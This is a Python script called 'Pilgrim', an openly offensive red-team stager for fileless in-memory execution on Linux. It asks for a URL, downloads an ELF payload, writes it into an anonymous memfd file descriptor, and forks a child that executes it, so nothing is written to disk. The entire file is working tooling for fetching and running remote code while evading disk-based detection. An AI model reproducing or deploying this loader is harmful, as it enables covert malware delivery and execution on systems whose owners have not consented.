#!/usr/bin/env python3

import os
from urllib import request, error
from random import choice
from string import ascii_lowercase

def banner():
	os.system("clear")
	print("""Pilgrim: Living off the Land with the ELF on the shELF!
By: Diante J., B.S. student at the University of Houston and founder of the Rolan Group

Silent ELF execution in Memory for Red Team Engagements
-----------------------------------------------------------------------------------------------\n""")

def createFD():
	print("[*] Creating the anonymous file descriptor...")
	fdID = ""
	for _ in range(7): # fd ID needs to be 7 characters of lowercase ascii chars
		fdID += choice(ascii_lowercase)

	fd = os.memfd_create(fdID, 0) # creates our malicious file descriptor
	if fd < 0:
		print("[!] Error: File Descriptor returned a negative value. Please try again!")
		exit(-1) # -1 for failure

	fd = "/proc/self/fd/" + str(fd) # create full address
	print("[*] FD successfully created! access it at {}!".format(fd))
	return fd

def getStage(): # download ELF stage using http
	url = input("[?] Please provide the URL of your stage: ")
	try:
		req = request.urlopen(url)
		elf = req.read()
		req.close()
		if req.msg == 'OK':
			print("[*] File successfully downloaded. Performing quality check...")
			test = input("[?] Is the file {} bytes? (y/n): ".format(len(elf)))
			if test.lower() == "y":
				print("[*] Success!")
				return elf # only path to successful execution is here.
	except:
		pass # pass execution irrespective of the exception to fail

	print("[!] Error downloading ELF stage. Please check URL and try again.")
	exit(-1)

def writeStage(fd, elf):
	print("[*] Writing ELF binary to {}".format(fd))
	with open(fd, 'wb') as f: # write the contents to the fd in binary mode, allowing it to be executed.
		f.write(elf)

def execStage(fd):
	args = input("[?] Input any arguments necessary to run the stage. Leave empty if there are none: ")

	args = fd + " " + args # argv[0] is always filename
	print("\n{}".format(args))
	test = input("[?] exec? (y/n): ")
	if test.lower() == "n":
		print("[!] Okay! Exiting stager!")
		exit(-1)

	arg_list = args.split()

	print("[*] Spawning a child process...")
	child_procid = os.fork()
	if child_procid == 0:
		print("[*] Process created!")
		print("[+] Executing stage!")
		os.execve(fd,arg_list,dict(os.environ)) # env and args are necessary to exec

if __name__ == "__main__":
	banner()
	fd = createFD()
	elf = getStage()

	writeStage(fd, elf)
	execStage(fd)
